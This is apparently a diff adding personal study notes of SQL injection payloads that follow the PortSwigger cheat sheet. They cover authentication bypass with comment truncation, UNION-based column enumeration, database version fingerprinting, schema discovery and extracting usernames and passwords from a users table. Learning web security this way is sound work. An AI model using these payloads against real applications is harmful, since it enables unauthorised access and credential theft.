@@ -1,0 +1,45 @@
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+#Access Hidden data
+GET /path?param=value HTTP/2 
+GET /path?param=value'+OR+1%3d1-- HTTP/2 #
+
+
+#Access Any User Login
+username=administrator&password=password
+username=administrator'--&password=password
+
+
+#UNION BASED MUST HAVE
+  #query with same number of columns
+  #CHECK
+    ' ORDER BY 2--, ' ORDER BY 3--, etc until error OR until diffrent http status code
+  #OR
+    ' UNION SELECT NULL--, ' UNION SELECT NULL,NULL--, etc until error OR until diffrent http status code
+
+  #IN ORACLE DB HAVE TO FROM, dual is built-in table
+  ' UNION SELECT NULL FROM DUAL--
+  
+  --query with same date type
+  ' UNION SELECT 'a',NULL,NULL,NULL--
+  ' UNION SELECT NULL,'a',NULL,NULL--
+  ' UNION SELECT NULL,NULL,'a',NULL--
+  ' UNION SELECT NULL,NULL,NULL,'a'--
+
+  #MORE THAN ONE COLUMN IN ONE, IF ORIGINAL QUERY HAVE ONLY ONE COLUMN
+  ' UNION SELECT username || '~' || password FROM users--
+
+  #VERSION
+Oracle 	SELECT banner FROM v$version
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version 
+
+#SCHEMA, except oracle
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+'+union+select+table_name,null+from+information_schema.tables-- 
+
+
+
+  
